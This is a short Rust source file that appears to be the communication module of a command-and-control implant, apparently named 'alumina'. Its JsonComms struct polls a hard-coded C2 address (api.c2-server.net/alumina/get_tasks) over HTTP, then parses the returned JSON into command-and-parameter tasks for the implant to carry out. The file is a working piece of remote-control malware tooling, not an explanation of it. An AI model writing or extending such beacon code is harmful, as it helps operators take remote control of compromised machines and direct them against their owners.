extern crate reqwest;
extern crate serde_json;

use serde::{Deserialize, Serialize};
use error_chain::error_chain;

error_chain! {
    foreign_links {
        Io(std::io::Error);
        HttpRequest(reqwest::Error);
    }
}

#[derive(Serialize, Deserialize)]
pub struct IntermediateTask {
    pub command: String,
    pub parameters: serde_json::Value,
}

pub struct Task {
    pub command: String,
    pub parameters: std::collections::HashMap<String, String>,
}

pub struct JsonComms {
    pub server: String,
}

impl JsonComms {
    pub fn get_tasks(&self) -> Vec<Task> {
        let body = self._get_task_request().unwrap();
        println!("{}", body);
        let intermediate_task_list:Vec<IntermediateTask> = serde_json::from_value(body).unwrap();

        let mut task_list = Vec::<Task>::new();
        for elem in intermediate_task_list {
            let parameters: std::collections::HashMap<String, String> = serde_json::from_value(elem.parameters).unwrap();
            let new_task = Task {
                command: elem.command,
                parameters: parameters
            };
            task_list.push(new_task);
        }
        return task_list;
    }

    pub fn _get_task_request(&self) -> Result<serde_json::Value> {
        let body = reqwest::blocking::get("http://api.c2-server.net/alumina/get_tasks")?.json::<serde_json::Value>()?;
        Ok(body)
    }
}
